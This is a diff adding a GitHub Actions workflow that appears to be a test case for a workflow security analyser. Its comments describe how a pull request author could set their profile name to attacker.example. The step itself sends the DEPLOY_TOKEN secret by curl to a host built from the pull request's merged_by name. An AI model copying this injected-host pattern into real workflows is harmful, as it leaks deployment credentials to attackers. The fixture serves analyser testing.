@@ -1,0 +1,26 @@
+# situation: on a pull request that is closed, a step sends a request with
+#   curl and the secret DEPLOY_TOKEN to the host that the name of the account
+#   that merged the pull request names.
+# reason: whether GitHub sets merged_by of a merged pull request to the
+#   account of the author of the pull request was not checked: no payload with
+#   merged_by was seen on GitHub. Were merged_by the author, the author would
+#   write the name of merged_by, which is the profile name of the account of
+#   the author.
+# cause: the table of what an attacker controls reads merged_by as the
+#   account that merged the pull request, and the account that merged the pull
+#   request holds a credential that can merge.
+# attack: the author of a pull request sets the profile name of the account
+#   of the author to attacker.example, and the pull request is merged.
+# attack-run-behavior: were merged_by the author of the pull request, curl
+#   would send the request with the secret to attacker.example.
+on:
+  pull_request_target:
+    types: [closed]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.pull_request.merged_by.name }}/status"
